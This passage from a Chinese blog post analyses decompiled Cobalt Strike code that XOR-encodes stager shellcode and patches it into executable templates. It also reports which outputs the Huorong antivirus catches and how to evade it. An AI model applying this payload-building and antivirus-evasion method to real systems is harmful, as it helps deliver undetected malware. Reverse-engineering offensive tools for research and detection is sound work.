和x64CommonUtils.writeByte(this.stager,"execshellcode.bin");  我们把生成的 execshellcode.bin 使用我们的loader加载一下看看</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231038296.png" alt="生成的shellcode"><br>使用我们自己的分离shellcode加载器加载shellcode 我们看到直接上线成功<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231039529.png" alt="自己加载shellcode"><br>在内存中我们看到。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231040463.png" alt="内存中表现形式"><br>查看网络连接<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231041453.png" alt="火绒查壳网络连接"><br>并且火绒对分阶段的shellcode execshellcode.bin  放行不杀。因为这个不是关键作用。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231042360.png" alt="分解机shellcode"><br>我们点击保存一下 这次调用函数<br>src&#x2F;aggressor&#x2F;dialogs&#x2F;WindowsExecutableDialog.java</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">dialogResult</span><span class="token punctuation">(</span><span class="token class-name">String</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"点击保存的时候触发生成结果。。。。。。"</span><span class="token operator">+</span>var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> var2 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>options<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"output"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">""</span><span class="token punctuation">;</span><span class="token keyword">boolean</span> var3 <span class="token operator">=</span> <span class="token class-name">DialogUtils</span><span class="token punctuation">.</span><span class="token function">bool</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>options<span class="token punctuation">,</span> <span class="token string">"x64"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">boolean</span> var4 <span class="token operator">=</span> <span class="token class-name">DialogUtils</span><span class="token punctuation">.</span><span class="token function">bool</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>options<span class="token punctuation">,</span> <span class="token string">"sign"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var3<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var2<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"Windows EXE"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ArtifactUtils</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>client<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">patchArtifact</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stager<span class="token punctuation">,</span> <span class="token string">"artifact64.exe"</span><span class="token punctuation">,</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var2<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"Windows Service EXE"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ArtifactUtils</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>client<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">patchArtifact</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stager<span class="token punctuation">,</span> <span class="token string">"artifact64svc.exe"</span><span class="token punctuation">,</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var2<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"Windows DLL"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ArtifactUtils</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>client<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">patchArtifact</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stager<span class="token punctuation">,</span> <span class="token string">"artifact64.x64.dll"</span><span class="token punctuation">,</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var2<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"Windows EXE"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ArtifactUtils</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>client<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">patchArtifact</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stager<span class="token punctuation">,</span> <span class="token string">"artifact32.exe"</span><span class="token punctuation">,</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"dialogResult Patch artifact32.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var2<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"Windows Service EXE"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ArtifactUtils</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>client<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">patchArtifact</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stager<span class="token punctuation">,</span> <span class="token string">"artifact32svc.exe"</span><span class="token punctuation">,</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var2<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"Windows DLL"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ArtifactUtils</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>client<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">patchArtifact</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stager<span class="token punctuation">,</span> <span class="token string">"artifact32.dll"</span><span class="token punctuation">,</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>var4<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span><span class="token class-name">DataUtils</span><span class="token punctuation">.</span><span class="token function">getSigner</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>client<span class="token punctuation">.</span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">sign</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var6<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">MudgeSanity</span><span class="token punctuation">.</span><span class="token function">logException</span><span class="token punctuation">(</span><span class="token string">"Could not sign '"</span> <span class="token operator">+</span> var1 <span class="token operator">+</span> <span class="token string">"'"</span><span class="token punctuation">,</span> var6<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">DialogUtils</span><span class="token punctuation">.</span><span class="token function">showError</span><span class="token punctuation">(</span><span class="token string">"Could not sign the file\nSaved unsigned "</span> <span class="token operator">+</span> var2 <span class="token operator">+</span> <span class="token string">" to\n"</span> <span class="token operator">+</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token class-name">DialogUtils</span><span class="token punctuation">.</span><span class="token function">showInfo</span><span class="token punctuation">(</span><span class="token string">"Saved "</span> <span class="token operator">+</span> var2 <span class="token operator">+</span> <span class="token string">" to\n"</span> <span class="token operator">+</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>我们来看这段代码    (new ArtifactUtils(this.client)).patchArtifact(this.stager, “artifact64.exe”, var1);</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231044272.png" alt="生成shellcode"><br>src&#x2F;common&#x2F;BaseArtifactUtils.java</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">patchArtifact</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var1<span class="token punctuation">,</span> <span class="token class-name">String</span> var2<span class="token punctuation">,</span> <span class="token class-name">String</span> var3<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stager<span class="token punctuation">,</span> <span class="token string">"artifact64.exe"</span><span class="token punctuation">,</span> exe保存位置<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var4 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">patchArtifact</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeToFile</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>var3<span class="token punctuation">)</span><span class="token punctuation">,</span> var4<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">patchArtifact</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var1<span class="token punctuation">,</span> <span class="token class-name">String</span> var2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">A</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token class-name">Stack</span> var3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var3<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token class-name">SleepUtils</span><span class="token punctuation">.</span><span class="token function">getScalar</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var3<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token class-name">SleepUtils</span><span class="token punctuation">.</span><span class="token function">getScalar</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> var4 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>client<span class="token punctuation">.</span><span class="token function">getScriptEngine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"EXECUTABLE_ARTIFACT_GENERATOR"</span><span class="token punctuation">,</span> var3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> var4 <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">fixChecksum</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_patchArtifact</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var2<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">fixChecksum</span><span class="token punctuation">(</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span>var4<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>patchArtifact 对于java agent进行检测 发现agent 退出<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231045476.png" alt="检测关键字"><br>从代码中我们看到对shellcode 进行patch  具体patch代码。如果var4 &#x3D;&#x3D; null ? this.fixChecksum(this._patchArtifact(var1, var2))   var4等于null进去</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">_patchArtifact</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var1<span class="token punctuation">,</span> <span class="token class-name">String</span> var2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span> var3 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"artifact32"</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">"x86"</span> <span class="token operator">:</span> <span class="token string">"x64"</span><span class="token punctuation">;</span><span class="token class-name">InputStream</span> var4 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">resource</span><span class="token punctuation">(</span><span class="token string">"resources/"</span> <span class="token operator">+</span> var2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"读取: "</span><span class="token operator">+</span>var2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var5 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">readAll</span><span class="token punctuation">(</span>var4<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//artifact64big.exe</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span>var5<span class="token punctuation">,</span>var2<span class="token operator">+</span><span class="token string">".bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var4<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var6 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">254</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">254</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">254</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">254</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var7 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span>var1<span class="token punctuation">.</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span><span class="token string">"Patch加载器直接加载"</span><span class="token operator">+</span>var3<span class="token operator">+</span><span class="token string">"shellcode.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//直接使用loader加载</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> var8 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> var8 <span class="token operator">&lt;</span> var1<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>var8<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// System.out.println("亦或的数字是: " +var6[var8 % 4]);</span>var7<span class="token punctuation">[</span>var8<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token punctuation">(</span>var1<span class="token punctuation">[</span>var8<span class="token punctuation">]</span> <span class="token operator">^</span> var6<span class="token punctuation">[</span>var8 <span class="token operator">%</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//亦或加密后到内存还原解密加载shellcode</span><span class="token punctuation">&#125;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span>var7<span class="token punctuation">,</span><span class="token string">"Patchartifact"</span><span class="token operator">+</span>var3<span class="token operator">+</span><span class="token string">"shellcode亦或后.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> yihuohuanyuan <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span>var7<span class="token punctuation">.</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> var7<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>yihuohuanyuan<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token punctuation">(</span>var7<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> var6<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//还原</span><span class="token punctuation">&#125;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span>yihuohuanyuan<span class="token punctuation">,</span><span class="token string">"Patchartifact"</span><span class="token operator">+</span>var3<span class="token operator">+</span><span class="token string">"shellcode亦或后还原.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> var13 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">bString</span><span class="token punctuation">(</span>var5<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//artifact32.exe 转换成字符串 artifact64big.exe</span><span class="token keyword">int</span> var9 <span class="token operator">=</span> var13<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//找里面的AAA</span><span class="token class-name">Packer</span> var10 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Packer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var10<span class="token punctuation">.</span><span class="token function">little</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var10<span class="token punctuation">.</span><span class="token function">addInteger</span><span class="token punctuation">(</span>var9 <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var10<span class="token punctuation">.</span><span class="token function">addInteger</span><span class="token punctuation">(</span>var1<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>var10<span class="token punctuation">.</span><span class="token function">addString</span><span class="token punctuation">(</span>var6<span class="token punctuation">,</span> var6<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">BeaconLoader</span><span class="token punctuation">.</span><span class="token function">hasLoaderHint</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>client<span class="token punctuation">,</span> var1<span class="token punctuation">,</span> var3<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var10<span class="token punctuation">.</span><span class="token function">addInteger</span><span class="token punctuation">(</span><span class="token class-name">BeaconLoader</span><span class="token punctuation">.</span><span class="token function">getLoaderHint</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> <span class="token string">"GetModuleHandleA"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var10<span class="token punctuation">.</span><span class="token function">addInteger</span><span class="token punctuation">(</span><span class="token class-name">BeaconLoader</span><span class="token punctuation">.</span><span class="token function">getLoaderHint</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> <span class="token string">"GetProcAddress"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>var10<span class="token punctuation">.</span><span class="token function">addInteger</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var10<span class="token punctuation">.</span><span class="token function">addInteger</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>var10<span class="token punctuation">.</span><span class="token function">addString</span><span class="token punctuation">(</span>var7<span class="token punctuation">,</span> var7<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">License</span><span class="token punctuation">.</span><span class="token function">isTrial</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>var10<span class="token punctuation">.</span><span class="token function">addString</span><span class="token punctuation">(</span><span class="token string">"X5O!P%@AP[4\\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">print_trial</span><span class="token punctuation">(</span><span class="token string">"Added EICAR string to "</span> <span class="token operator">+</span> var2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var11 <span class="token operator">=</span> var10<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span>var11<span class="token punctuation">,</span>var2<span class="token operator">+</span><span class="token string">"填充A.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span>var7<span class="token punctuation">,</span><span class="token string">"Patchartifact"</span><span class="token operator">+</span>var3<span class="token operator">+</span><span class="token string">"shellcode亦或后2.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>var13 <span class="token operator">=</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">replaceAt</span><span class="token punctuation">(</span>var13<span class="token punctuation">,</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">bString</span><span class="token punctuation">(</span>var11<span class="token punctuation">)</span><span class="token punctuation">,</span> var9<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//填充artifact64big.exe 的A</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">writeByte</span><span class="token punctuation">(</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span>var13<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"Patchartifact"</span><span class="token operator">+</span>var3<span class="token operator">+</span><span class="token string">"shellcode亦或后3.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">toBytes</span><span class="token punctuation">(</span>var13<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> var12<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">MudgeSanity</span><span class="token punctuation">.</span><span class="token function">logException</span><span class="token punctuation">(</span><span class="token string">"patchArtifact"</span><span class="token punctuation">,</span> var12<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>点击保存执行过程</p><pre class="language-shell" data-language="shell"><code class="language-shell">点击保存的时候触发生成结果。。。。。。C:\Users\Administrator\Desktop\artifact_x64.exe读取: resources&#x2F;artifact64.exe写入: shellcode&#x2F;artifact64.exe.bin写入: shellcode&#x2F;Patch加载器直接加载x64shellcode.bin写入: shellcode&#x2F;Patchartifactx64shellcode亦或后.bin写入: shellcode&#x2F;Patchartifactx64shellcode亦或后还原.bin写入: shellcode&#x2F;artifact64.exe填充A.bin写入: shellcode&#x2F;Patchartifactx64shellcode亦或后2.bincall replaceAt!!!写入: shellcode&#x2F;Patchartifactx64shellcode亦或后3.binfix checksum!!!!PEEditor fix checksum!!!!写入: shellcode&#x2F;nofixsum.bin写入: shellcode&#x2F;fixchecsum.bin</code></pre><p>我们看 原来的resources&#x2F;artifact64.exe  有一堆A<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231046669.png" alt="artifact64.exe"><br>我们使用原来的 artifact64.exe  火绒直接杀。所以要免杀得修改修改artifact64.exe 要不即使你填充了还是被杀这就是为什么生成默认的exe生成即被杀。因为模版被标记了肯定会被杀。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501231047539.png" alt="火绒查杀"><br>把shellcode 异或以后在填充到artifact64.exe里面 相关关键代码</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var6 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token class-name">CommonUtils</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">254</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span><span class="token 